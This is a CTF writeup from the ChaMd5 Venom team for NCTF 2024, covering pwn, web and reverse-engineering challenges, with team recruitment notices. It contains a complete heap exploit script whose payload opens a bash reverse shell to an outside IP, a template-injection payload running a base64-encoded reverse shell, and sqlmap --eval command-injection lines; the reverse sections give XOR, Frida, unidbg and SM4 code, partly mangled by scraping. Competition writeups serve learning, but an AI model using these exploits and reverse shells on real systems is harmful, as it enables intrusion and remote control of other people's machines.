# NCTF 2024 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/233620.html
> ID: 233620

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

Pwn: 

unauth-diary

协议pwn堆题

2.39

存在整数溢出，add对size没有限制，输入0，edit可以造成堆溢出

已泄露出libc_base,heap_base

攻击IO_list_all，走house of cat

最后system(/bin/sh)打不通，通过反弹shell getshell

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./test-libc.so.6')   

elf=ELF('./pwn')
#p=remote('',)
#p = process('./pwn')
#p = remote('127.0.0.1',9999)
p = remote('39.106.16.204',52351)
def add(size,content):
        sla(">",str(1))
        sla("Input length:n",str(size))
        sa("Input content:n",content)
        
def free(i):
        sla(">",str(2))
        sla("Input index:n",str(i))
        
def show(i):
        sla(">",str(4))
        sla("Input index:n",str(i))
def edit(i,content):
        sla(">",str(3))
        sla("Input index:n",str(i))
        sa("Input content:n",content)

add(0x420,b'a'+b'n') #0
add(0x68,b'a'+b'n')#1
free(0)
add(0x68,b'n')#0
show(0)
a=get_addr64()
libc_base=get_addr64()-2113296
li(hex(libc_base))
malloc_hook,free_hook=get_hook()
IO_list_all=libc_base+libc.sym['_IO_list_all']
setcontext=libc_base+libc.sym['setcontext']
system,bin_sh=get_sb()
rdi = libc_base+0x000000000010f75b
rsi = libc_base+0x0000000000110a4d
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rax = libc_base+0x00000000000dd237
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
p.recv(2)
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x2b0
li(hex(heap_base))

add(0x380,b'a'+b'n')#2

add(-1,b'a'+b'n')#3
add(0x68,b'a'+b'n')#4
add(0x68,b'a'+b'n')#5
add(0x28,b'a'+b'n')

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

chunk3=heap_base+0x1970# 伪造的fake_IO结构体的地址

orw  = p64(rdi) + p64(heap_base+0x1430)  
orw += p64(rsi) + p64(0)
orw += p64(open)

orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap_base+0x200)
orw += p64(rdx) + p64(0x50)
orw += p64(read)

orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap_base+0x200)
orw += p64(rdx) + p64(0x50)
orw += p64(write)
shell=p64(rdi+1)+p64(rdi)+p64(heap_base+0x990)+p64(rdi+1)+p64(system)

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

fake_IO_FILE  =p64(0)*2+p64(1)+p64(chunk3+0x8)  
fake_IO_FILE  =fake_IO_FILE.ljust(0x60,b'x00')  
fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi
fake_IO_FILE +=p64(heap_base)              
fake_IO_FILE +=p64(0x100)                       #rdx
fake_IO_FILE  =fake_IO_FILE.ljust(0x90, b'x00')
fake_IO_FILE +=p64(chunk3+0x8)                  #_wide_data,rax1_addr
fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1)      #rsp
fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2
fake_IO_FILE +=p64(_IO_wfile_jumps+0x30)        # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)
fake_IO_FILE += shell
payload=fake_IO_FILE.ljust(0x520-1,b'a')+b'n'
pay = b'/bin/bash -c "/bin/bash -i >& /dev/tcp/106.75.70.202/4444 0>&1"'.ljust(0x520, b'x00')

add(0x520,pay)#7
add(0x520,b'a'*0x520)
add(0x520,b'./flagx00x00'+b'n')
add(0x520,payload)#12

free(5)
free(4)
xor=(heap_base+0x7d0>>12)^IO_list_all
edit(3,p64(0)*3+p64(0x21)+p64(xor)+b'n')
add(0x17,p64(heap_base+0x1970)+b'n')
#bug()
sla(">",str(5))

inter()        

 Web: 

ez_dash

/render路由过滤没过全，template模板可以解析<%%>

<%
t = __import__('os')
s = getattr(t, 'system')
s('echo YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMS44Ni85MDAwIDA+JjE= | base64 -d | bash')
%>

可以直接反弹shell

sqlmap-master

http://127.0.0.2 --eval='import subprocess;subprocess.Popen(chr(108)+chr(115))'

双引号被转义

本地能成功rce，远程不知道为啥

日志里面的语句也没问题，奇怪

换个语句就行了

127.0.0.1 --eval eval("__import__('os').system('env')")

 Reverse: 

ezDOS

对输入的字符串进行单字符异或

si就是输入字符串异或后的数据

di就是密文

使用测试数据：BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

得到密文：

使密文对测试数据再次异或得到异或流Key

0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xc4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1

值得注意的是尽量使用多个测试数据进行测试，因为我使用

NCTF{Y0u_4r3AAAAAAAAAAAAAAAAAAAAAAAAA}

得到的密文却是

0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xf4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1

解密的话使用密文对这个异或流Key进行异或一次即可。密文在IDApro里能直接提取；

但需要注意的是0x26不是密文。

#include <iostream>
#include <Windows.h>

int main()
{
    unsignedchar key[] = { 0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xf4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1 };
    unsignedchar key2[] = { 0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xc4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1 };
    unsignedchar enc[] =
    {
      0x7C, 0x3E, 0x0D, 0x3C, 0x88, 0x54, 0x83, 0x0E, 0x3B, 0xB8,
      0x99, 0x1B, 0x9B, 0xE5, 0x23, 0x43, 0xC5, 0x80, 0x45, 0x5B,
      0x9A, 0x29, 0x24, 0x38, 0xA9, 0x5C, 0xCB, 0x7A, 0xE5, 0x93,
      0x73, 0x0E, 0x70, 0x6D, 0x7C, 0x31, 0x2B, 0x8C
    };
    for (int i = 0; i < 38; i++) {
        enc[i] ^= key2[i];
        printf("%c", enc[i]);
    }
}
//NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}

x1Login

先逛一下主逻辑，发现有一系列的反调机制检测，那么直接mt管理器一把梭，将返回值全部改为0，一劳永逸，基于没有签名校验可以这么干

然后是对于逻辑中的一些调用方法名有一个自实现的native层的混淆方法get

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./test-libc.so.6')   

elf=ELF('./pwn')
#p=remote('',)
#p = process('./pwn')
#p = remote('127.0.0.1',9999)
p = remote('39.106.16.204',52351)
def add(size,content):
        sla(">",str(1))
        sla("Input length:n",str(size))
        sa("Input content:n",content)
        
def free(i):
        sla(">",str(2))
        sla("Input index:n",str(i))
        
def show(i):
        sla(">",str(4))
        sla("Input index:n",str(i))
def edit(i,content):
        sla(">",str(3))
        sla("Input index:n",str(i))
        sa("Input content:n",content)

add(0x420,b'a'+b'n') #0
add(0x68,b'a'+b'n')#1
free(0)
add(0x68,b'n')#0
show(0)
a=get_addr64()
libc_base=get_addr64()-2113296
li(hex(libc_base))
malloc_hook,free_hook=get_hook()
IO_list_all=libc_base+libc.sym['_IO_list_all']
setcontext=libc_base+libc.sym['setcontext']
system,bin_sh=get_sb()
rdi = libc_base+0x000000000010f75b
rsi = libc_base+0x0000000000110a4d
rdx = libc_base+libc.search(asm("pop rdxnret")).__next__()
rax = libc_base+0x00000000000dd237
ret = libc_base+libc.search(asm("ret")).__next__()
syscall=libc_base+libc.search(asm("syscallnret")).__next__()
open=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
p.recv(2)
heap_base=u64(p.recv(6).ljust(8,b'x00'))-0x2b0
li(hex(heap_base))

add(0x380,b'a'+b'n')#2

add(-1,b'a'+b'n')#3
add(0x68,b'a'+b'n')#4
add(0x68,b'a'+b'n')#5
add(0x28,b'a'+b'n')

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

chunk3=heap_base+0x1970# 伪造的fake_IO结构体的地址

orw  = p64(rdi) + p64(heap_base+0x1430)  
orw += p64(rsi) + p64(0)
orw += p64(open)

orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap_base+0x200)
orw += p64(rdx) + p64(0x50)
orw += p64(read)

orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap_base+0x200)
orw += p64(rdx) + p64(0x50)
orw += p64(write)
shell=p64(rdi+1)+p64(rdi)+p64(heap_base+0x990)+p64(rdi+1)+p64(system)

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

fake_IO_FILE  =p64(0)*2+p64(1)+p64(chunk3+0x8)  
fake_IO_FILE  =fake_IO_FILE.ljust(0x60,b'x00')  
fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi
fake_IO_FILE +=p64(heap_base)              
fake_IO_FILE +=p64(0x100)                       #rdx
fake_IO_FILE  =fake_IO_FILE.ljust(0x90, b'x00')
fake_IO_FILE +=p64(chunk3+0x8)                  #_wide_data,rax1_addr
fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1)      #rsp
fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2
fake_IO_FILE +=p64(_IO_wfile_jumps+0x30)        # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)
fake_IO_FILE += shell
payload=fake_IO_FILE.ljust(0x520-1,b'a')+b'n'
pay = b'/bin/bash -c "/bin/bash -i >& /dev/tcp/106.75.70.202/4444 0>&1"'.ljust(0x520, b'x00')

add(0x520,pay)#7
add(0x520,b'a'*0x520)
add(0x520,b'./flagx00x00'+b'n')
add(0x520,payload)#12

free(5)
free(4)
xor=(heap_base+0x7d0>>12)^IO_list_all
edit(3,p64(0)*3+p64(0x21)+p64(xor)+b'n')
add(0x17,p64(heap_base+0x1970)+b'n')
#bug()
sla(">",str(5))

inter()
```



```
<%
t = __import__('os')
s = getattr(t, 'system')
s('echo YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDUuMS44Ni85MDAwIDA+JjE= | base64 -d | bash')
%>
```



```
http://127.0.0.2 --eval='import subprocess;subprocess.Popen(chr(108)+chr(115))'
```



```
127.0.0.1 --eval eval("__import__('os').system('env')")
```



```
0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xc4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1
```



```
0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xf4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1
```



```
#include <iostream>
#include <Windows.h>

int main()
{
    unsignedchar key[] = { 0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xf4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1 };
    unsignedchar key2[] = { 0x32,0x7d,0x59,0x7a,0xf3,0xd,0xb3,0x7b,0x64,0x8c,0xeb,0x28,0xc4,0xa4,0x50,0x30,0xa0,0xed,0x27,0x6a,0xe3,0x76,0x69,0xc,0xda,0x28,0xf8,0x8,0xba,0xa6,0x17,0x3e,0x12,0x59,0x45,0x6,0x4e,0xf1 };
    unsignedchar enc[] =
    {
      0x7C, 0x3E, 0x0D, 0x3C, 0x88, 0x54, 0x83, 0x0E, 0x3B, 0xB8,
      0x99, 0x1B, 0x9B, 0xE5, 0x23, 0x43, 0xC5, 0x80, 0x45, 0x5B,
      0x9A, 0x29, 0x24, 0x38, 0xA9, 0x5C, 0xCB, 0x7A, 0xE5, 0x93,
      0x73, 0x0E, 0x70, 0x6D, 0x7C, 0x31, 0x2B, 0x8C
    };
    for (int i = 0; i < 38; i++) {
        enc[i] ^= key2[i];
        printf("%c", enc[i]);
    }
}
//NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}
```



```
Java.perform(function () {
    var DecStr = Java.use("com.nctf.simplelogin.DecStr");

    DecStr.get.implementation = function (encryptedStr) {
        console.log("[*] Hooked DecStr.get() with argument: " + encryptedStr);
        var result = this.get(encryptedStr);
        return result;
    };
    var encryptedStrings = [
        "ygvUF2vHFgbPiN9J",
        "Exv3nhr5BNW0axn3aNz/DNv9C3q0wxj/Exe=",
        "zM1GzM4=",
        "agDYB3bJ"
    ];

    encryptedStrings.forEach(function (str) {
        var decrypted = DecStr.get(str);
        console.log("[*] Decrypted result: " + decrypted);
    });
});
```



```
package com.killnctf;

import com.github.unidbg.AndroidEmulator;
import com.github.unidbg.Module;
import com.github.unidbg.arm.backend.UnHook;
import com.github.unidbg.arm.backend.Unicorn2Factory;
import com.github.unidbg.arm.backend.CodeHook;
import com.github.unidbg.linux.android.AndroidEmulatorBuilder;
import com.github.unidbg.linux.android.AndroidResolver;
import com.github.unidbg.linux.android.dvm.*;
import com.github.unidbg.linux.android.dvm.array.ByteArray;
import com.github.unidbg.memory.Memory;
import com.github.unidbg.arm.backend.Backend;
import unicorn.Arm64Const;

import java.io.File;

publicclass xvideo extends AbstractJni {
    privatefinal AndroidEmulator emulator;
    privatefinal DvmClass NativeApi;
    privatefinal VM vm;
    privatefinal Module module;

    public xvideo() {
        emulator = AndroidEmulatorBuilder
                .for64Bit()
                .addBackendFactory(new Unicorn2Factory(true))
                .setProcessName("com.nctf.simplelogin")
                .build();

        Memory memory = emulator.getMemory();
        memory.setLibraryResolver(new AndroidResolver(23));

        vm = emulator.createDalvikVM(new File("unidbg-android/src/test/resources/killnctf/zqh.apk"));
        vm.setJni(this);
        vm.setVerbose(true);

        File soFile = new File("libnative.so");
        if (!soFile.exists()) {
            thrownew IllegalStateException("libnative.so 文件不存在: " + soFile.getAbsolutePath());
        }
        DalvikModule dm = vm.loadLibrary(soFile, true);
        module = dm.getModule();
        NativeApi = vm.resolveClass("com/nctf/simplelogin/Secure");
        System.out.println("NativeApi resolved: " + (NativeApi != null));

        // 设置钩子
        setupHooks();

        dm.callJNI_OnLoad(emulator);
    }

    private void setupHooks() {
        long baseAddress = module.base;
        
        finallong sub_2644_addr = baseAddress + 0x2644;
        finallong sub_2DC4_addr = baseAddress + 0x2DC4;

        emulator.getBackend().hook_add_new(new CodeHook() {
            @Override
            public void hook(Backend backend, long address, int size, Object user) {
                if (address == sub_2644_addr) {
                    long x1Value = backend.reg_read(Arm64Const.UC_ARM64_REG_X1).longValue();
                    System.out.println("[sub_2644] X1 Value: 0x" + Long.toHexString(x1Value));
                }
            }

            @Override
            public void onAttach(UnHook unHook) {

            }

            @Override
            public void detach() {
                // 留空或实现钩子移除逻辑
            }
        }, sub_2644_addr, sub_2644_addr + 4, null);

        // Hook sub_2DC4
        emulator.getBackend().hook_add_new(new CodeHook() {
            @Override
            public void hook(Backend backend, long address, int size, Object user) {
                if (address == sub_2DC4_addr) {
                    long x1Value = backend.reg_read(Arm64Const.UC_ARM64_REG_X1).longValue();
                    System.out.println("[sub_2DC4] X1 Value: 0x" + Long.toHexString(x1Value));
                }
            }
            @Override
            public void onAttach(UnHook unHook) {

            }
            @Override
            public void detach() {
                // 留空或实现钩子移除逻辑
            }
        }, sub_2DC4_addr, sub_2DC4_addr + 4, null);
    }

    public boolean calls() {
        String arg1 = "aaaaaaaaaaaaaaaaaaaaaaaa";
        byte[] arg2 = {125, 83, (byte) 236, (byte) 211, 106, 67, (byte) 211, (byte) 210, 55, (byte) 231, (byte) 221, 99, 61, (byte) 207, (byte) 132, (byte) 151};//用户名的md5字节流
        boolean result = NativeApi.newObject(null)
                .callJniMethodBoolean(emulator, "doCheck(Ljava/lang/String;[B)Z", arg1, arg2);
        return result;
    }

    public static void main(String[] args) {
        xvideo xv = new xvideo();
        boolean result = xv.calls();
        System.out.println("call s result: " + result);
    }
}
```



```
#include <stdio.h>

void swap_chars(int *a1, int *a2)
{
    int temp = *a1;
    *a1 = *a2;
    *a2 = temp;
}

int main()
{
    int sbox[256] = {
        0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 
        0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 
        0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 
        0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 
        0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 
        0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 
        0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 
        0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 
        0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 
        0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 
        0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 
        0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 
        0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 
        0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 
        0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 
        0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 
        0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 
        0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 
        0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 
        0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 
        0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 
        0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 
        0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 
        0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 
        0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 
        0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48
    };
    int index_list[10] = {78, 67, 84, 70, 50, 52, 110, 99, 116, 102};
    for (int j = 0; j < 10; ++j) {
        swap_chars(&sbox[0], &sbox[index_list[j]]);
    }
    for (int i = 0; i < 256; i++) {
        printf("0x%02X,", sbox[i]);
    }
    printf("n");

    return0;
}

#include <string.h>
#include <stdio.h>
#include <time.h>
/*--------------------------------------------------------------------------------------------------------------*/
#define SM4_ENCRYPT 1
#define SM4_DECRYPT 0
/*--------------------------------------------------------------------------------------------------------------*/
/**
 * brief          SM4 context structure
 */
typedefstruct
{
    int mode;             /*!<  encrypt/decrypt   */
    unsignedlong sk[32]; /*!<  SM4 subkeys       */
} sm4_context;
/*--------------------------------------------------------------------------------------------------------------*/
/**
 * brief          SM4 key schedule (128-bit, encryption)
 *
 * param ctx      SM4 context to be initialized
 * param key      16-byte secret key
 */
void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16]);
/*--------------------------------------------------------------------------------------------------------------*/
/**
 * brief          SM4 key schedule (128-bit, decryption)
 *
 * param ctx      SM4 context to be initialized
 * param key      16-byte secret key
 */
void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16]);
/*--------------------------------------------------------------------------------------------------------------*/
/**
 * brief          SM4-ECB block encryption/decryption
 * param ctx      SM4 context
 * param mode     SM4_ENCRYPT or SM4_DECRYPT
 * param length   length of the input data
 * param input    input block
 * param output   output block
 */
void sm4_crypt_ecb(sm4_context *ctx,
                   int mode,
                   int length,
                   unsigned char *input,
                   unsigned char *output);
/*--------------------------------------------------------------------------------------------------------------*/
/**
 * brief          SM4-CBC buffer encryption/decryption
 * param ctx      SM4 context
 * param mode     SM4_ENCRYPT or SM4_DECRYPT
 * param length   length of the input data
 * param iv       initialization vector (updated after use)
 * param input    buffer holding the input data
 * param output   buffer holding the output data
 */
void sm4_crypt_cbc(sm4_context *ctx,
                   int mode,
                   int length,
                   unsigned char iv[16],
                   unsigned char *input,
                   unsigned char *output);
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * 32-bit integer manipulation macros (big endian)
 */
#ifndef GET_ULONG_BE
#define GET_ULONG_BE(n, b, i)                                                                                                                             
    {                                                                                                                                                     
        (n) = ((unsigned long)(b)[(i)] << 24) | ((unsigned long)(b)[(i) + 1] << 16) | ((unsigned long)(b)[(i) + 2] << 8) | ((unsigned long)(b)[(i) + 3]); 
    }
#endif
/*--------------------------------------------------------------------------------------------------------------*/
#ifndef PUT_ULONG_BE
#define PUT_ULONG_BE(n, b, i)                      
    {                                              
        (b)[(i)] = (unsigned char)((n) >> 24);     
        (b)[(i) + 1] = (unsigned char)((n) >> 16); 
        (b)[(i) + 2] = (unsigned char)((n) >> 8);  
        (b)[(i) + 3] = (unsigned char)((n));       
    }
#endif
/*--------------------------------------------------------------------------------------------------------------*/
/*
 *rotate shift left marco definition
 *
 */
#define SHL(x, n) (((x) & 0xFFFFFFFF) << n)
#define ROTL(x, n) (SHL((x), n) | ((x) >> (32 - n)))
#define SWAP(a, b)           
    {                        
        unsigned long t = a; 
        a = b;               
        b = t;               
        t = 0;               
    }
/*--------------------------------------------------------------------------------------------------------------*/
/*
* Expanded SM4 S-boxes
/* Sbox table: 8bits input convert to 8 bits output*/
staticconstunsignedchar SboxTable[16][16] =
    {
        {0xD1, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05},
        {0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},
        {0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62},
        {0xE4, 0xB3, 0x17, 0xA9, 0x1C, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6},
        {0x47, 0x07, 0xA7, 0x4F, 0xF3, 0x73, 0x71, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0xD6, 0xA8},
        {0x68, 0x6B, 0x81, 0xB2, 0xFC, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35},
        {0x1E, 0x24, 0x0E, 0x78, 0x63, 0x58, 0x9F, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0xC9, 0x87},
        {0xD4, 0x00, 0x46, 0x57, 0x5E, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E},
        {0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1},
        {0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3},
        {0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F},
        {0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51},
        {0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8},
        {0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0},
        {0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84},
        {0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48}};
/*--------------------------------------------------------------------------------------------------------------*/
/* System parameter */
staticconstunsignedlong FK[4] =
    {0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc};
/*--------------------------------------------------------------------------------------------------------------*/
/* fixed parameter */
staticconstunsignedlong CK[32] =
    {
        0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
        0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
        0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
        0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
        0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
        0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
        0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
        0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279};
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * private function:
 * look up in SboxTable and get the related value.
 * args:    [in] inch: 0x00~0xFF (8 bits unsigned value).
 */
